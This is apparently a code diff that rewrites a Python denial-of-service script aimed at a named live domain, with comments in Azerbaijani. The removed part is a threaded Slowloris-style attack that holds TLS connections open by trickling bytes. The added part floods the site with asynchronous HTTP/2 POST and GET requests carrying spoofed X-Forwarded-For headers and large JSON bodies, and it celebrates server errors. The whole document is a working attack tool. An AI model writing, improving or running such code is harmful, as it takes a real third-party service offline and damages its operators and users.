@@ -1,78 +1,63 @@
-import socket
-import ssl
-import threading
+import asyncio
+import httpx
 import random
 import string
 import time
-import os
 
-# --- EXTREME SETTINGS ---
-TARGET_HOST = "www.appl88-vip.com"
-TARGET_PORT = 443
-THREADS = 1500 # Railway Paid plan üçün maksimal güc
-PAYLOAD_SIZE = 1048576 # 1 MB-lıq "yalançı" yük hər bağlantı üçün
+TARGET_URL = "https://www.appl88-vip.com/"
+# Asinxron limitlər (Railway üçün ideal güc)
+WORKERS = 1000 
 
 def r_str(n):
-    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
 
-def attack():
-    # SSL Handshake-i serveri ən çox yoran şəkildə qururuq
-    ctx = ssl.create_default_context()
-    ctx.check_hostname = False
-    ctx.verify_mode = ssl.CERT_NONE
-    ctx.set_ciphers('ALL:@SECLEVEL=0') 
-
+async def blast_worker(worker_id, client):
     while True:
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1) # Nagle bypass
-            s.settimeout(10)
-
-            conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
-            conn.connect((TARGET_HOST, TARGET_PORT))
-
-            # Serveri "gözləmə" rejiminə salan çox ağır POST header-i
-            # Content-Length-i süni şəkildə çox böyük göstəririk
-            forwarded_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,254)}"
+            # Serveri yoran mürəkkəb URL parametrləri
+            url = f"{TARGET_URL}?v={time.time()}&invite_code={random.randint(1000, 9999)}&ttclid=E_C_P_{r_str(50)}"
             
-            header = (
-                f"POST / HTTP/1.1\r\n"
-                f"Host: {TARGET_HOST}\r\n"
-                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
-                f"Content-Type: application/x-www-form-urlencoded\r\n"
-                f"Content-Length: {PAYLOAD_SIZE}\r\n" # Server bu 1 MB-ın gəlməsini GÖZLƏYƏCƏK
-                f"X-Forwarded-For: {forwarded_ip}\r\n"
-                f"X-Requested-With: XMLHttpRequest\r\n"
-                f"Connection: Keep-Alive\r\n"
-                f"\r\n"
-            ).encode()
+            headers = {
+                "User-Agent": f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(15,17)}_0 like Mac OS X) AppleWebKit/605.1.15",
+                "Accept": "application/json, text/plain, */*",
+                "Content-Type": "application/json",
+                "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
+                "X-Requested-With": "XMLHttpRequest",
+                "Connection": "keep-alive"
+            }
 
-            conn.sendall(header)
+            # Serverin RAM-ını dərhal kilitləyən böyük JSON yükü
+            payload = {r_str(10): r_str(2000) for _ in range(10)}
 
-            # İndi serveri "asılı" vəziyyətdə saxlayırıq
-            # Hər saniyə cəmi 1-2 bayt göndərərək bağlantının qırılmasına imkan vermirik
-            for _ in range(100):
-                conn.send(os.urandom(random.randint(1, 4)))
-                time.sleep(random.uniform(0.1, 0.5))
+            # HTTP/2 Multiplexing - Eyni anda minlərlə yarımçıq paket
+            responses = await asyncio.gather(*[
+                client.post(url, headers=headers, json=payload, timeout=15),
+                client.get(url, headers=headers, timeout=15)
+            ], return_exceptions=True)
+            
+            # Əgər 5xx xətası gəlirse, deməli zərbə endirilir
+            for r in responses:
+                if hasattr(r, 'status_code') and r.status_code >= 500:
+                    print(f"☢️  BUM! Server Error {r.status_code}", end="\r")
 
-            conn.close()
-        except:
-            pass
+        except Exception:
+            await asyncio.sleep(0.01)
 
-def main():
-    print(f"☢️  DOOMSDAY PROTOCOL ACTIVATED: {TARGET_HOST}")
-    print(f"[*] Targeting RAM and Port Exhaustion with {THREADS} threads.")
+async def main():
+    print(f"🔥 TOTAL GIGA-BLAST INITIALIZED ON: {TARGET_URL}")
+    print("[*] Switching to Asynchronous Power - No Thread Limits.")
     
-    for i in range(THREADS):
-        t = threading.Thread(target=attack)
-        t.daemon = True
-        t.start()
-        if i % 100 == 0:
-            print(f"[*] {i} Warheads armed...")
-            time.sleep(0.1)
-
-    while True:
-        time.sleep(1)
+    limits = httpx.Limits(max_connections=WORKERS, max_keepalive_connections=WORKERS)
+    
+    async with httpx.AsyncClient(
+        http2=True, 
+        verify=False, 
+        limits=limits,
+        timeout=None # Server donanda bağlantını buraxma (Slowloris)
+    ) as client:
+        
+        workers = [blast_worker(i, client) for i in range(WORKERS)]
+        await asyncio.gather(*workers)
 
 if __name__ == "__main__":
-    main()
+    asyncio.run(main())
